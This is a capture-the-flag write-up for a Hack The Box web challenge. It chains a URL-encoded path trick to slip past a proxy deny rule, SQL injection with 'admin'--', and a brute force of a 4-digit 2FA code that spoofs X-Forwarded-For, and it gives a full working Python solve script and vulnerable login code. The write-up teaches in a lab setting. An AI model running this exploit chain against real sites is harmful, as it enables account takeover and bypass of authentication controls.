# Challenge: No threshold

**Lab Description**: Prepare for the finest magic products out there. However, please be aware that we've implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.🔮🎩

## Lab Solution

By the looks of it, if authentication is achieved the flag will be displayed, as per `dashboard.py`. SQLi is achievable on the login page, as the input is not sanitized and the SQL command is not parsed as a prepared statement. When logging in, the 2FA code is set. The `/auth/login` check can be bypassed by url encoding a character of the path. using `/auth/logi%6e` where `%6e` is URL encoded `n` will bypass the check. The same should be done when doing SQLi in post: `Path: {/auth/logi%6e}, Data: {username="admin'--", password: "a"}` will allow us through the to 2FA page.

Testing the solve script with the URL encoded `n`, we see that the proxy is redirecting to the correct page:

```curl
{'Content-Type': 'application/x-www-form-urlencoded', 'X-Forwared-for': '55.205.2.64'}
[b'<!doctype html>\n', b'<html lang=en>\n', b'<title>Redirecting...</title>\n', b'<h1>Redirecting...</h1>\n', b'<p>You should be redirected automatically to the target URL: <a href="/auth/verify-2fa">/auth/verify-2fa</a>. If not, click the link.\n']
```

Now the idea is to bruteforce the 2FA code, as it is only 4 characters in size. The bruteforce approach is chosen, as it is also observed that the 2FA code remains the same for 5 minutes, which is more than enough time to bruteforce 4 characters.

```python
def set_2fa_code(d):
    uwsgi.cache_del("2fa-code")
    uwsgi.cache_set(
        "2fa-code", "".join(random.choices(string.digits, k=d)), 300 # valid for 5 min
    ) 


@login_bp.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        
        username = request.form.get("username")
        password = request.form.get("password")

        if not username or not password:
            return render_template("public/login.html", error_message="Username or password is empty!"), 400
        try:
            user = query_db(
                f"SELECT username, password FROM users WHERE username = '{username}' AND password = '{password}'",
                one=True,
            )

            if user is None:
                return render_template("public/login.html", error_message="Invalid username or password"), 400

            set_2fa_code(4)

            return redirect("/auth/verify-2fa")
        finally:
            close_db()
    return render_template("public/login.html")
```

The above code is the login logic for the page. Where it is seen that when logging in, the `set_2fa_code(4)` function is called. Futhermore the value of 300 seconds equates to a five minute span, before the cache drops the 2FA code.

In order to bruteforce this, a script is created which will perform the SQLi on the Login page, and proceed to bruteforce the 2FA code:

```python
import http.client
from random import randint
from time import sleep

host = "localhost:1337"
# host = "83.136.254.199:38770"

conn = http.client.HTTPConnection(host)
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Forwarded-For': '.'.join([str(randint(1,256)) for _ in range(4)])
}

print(headers)
conn.request('POST', '/auth/logi%6E', 'username=admin%27+--&password=a', headers)
# Now there is a random code in the 2fa cache
# Sleep to make sure
sleep(1)
n = 0
while True:
    code = f'{n:04}'
    print(f'Guessing code: {code}')
    # We just guess codes now
    conn = http.client.HTTPConnection(host)
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Forwarded-For': '.'.join([str(randint(1,256)) for _ in range(4)])
    }
    conn.request('POST', '/auth/verify-2fa', '2fa-code='+code, headers)

    response = conn.getresponse()
    if response.code != 400:
        if not "/auth/login" in str(response.headers):
            print(response.readlines())
            print(response.headers)

            # Cookie should be in set-cookie header
            exit()
        else:
            print("ran out of time")
            exit()
    n += 1
```

The script first logs in as the admin user, using the SQLi payload `admin'--`, putting something random in the password field to pass the form check. After the format string `code=f'{n:04}'` pads the `n` variable with zeroes until it is 4 characters in size. Then the code is sent to the 2FA verification endpoint, if the response does not return HTTP status code 400, the headers of the response is printed to reveal the session cookie. Using this cookie with curl, the flag is obtained:

`curl -c 'session=eyJhdXRoZW50aWNhdGVkIjp0cnVlfQ.ZdDVOw.XcjobARlS0sCDu-65LbcST-CPXA' localhost:1337/dashboard`

**Note:** In the solve script, the HTTPConnection library is used instead of the requests library, as requests would parse the URL encoded character and format it, making the proxy catch us with this check: `http-request deny if { path_beg /auth/login }`

This challenge also shows why 2FA codes need to be replaced frequently, if they are short, as they can be bruteforced quite easily if the code has a size of a mere 4 characters.

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="/static/css/style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Press+Start+2P&display=swap">

    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <script src="/static/js/verify-2fa.js"></script>
    <title>Dashboard</title>
</head>

<body>
    <div class="container">
        <div class="content">
            Welcome, here is your flag: <b> HTB{redacted} </b>
        </div>
    </div>
</body>

</html>% 
```
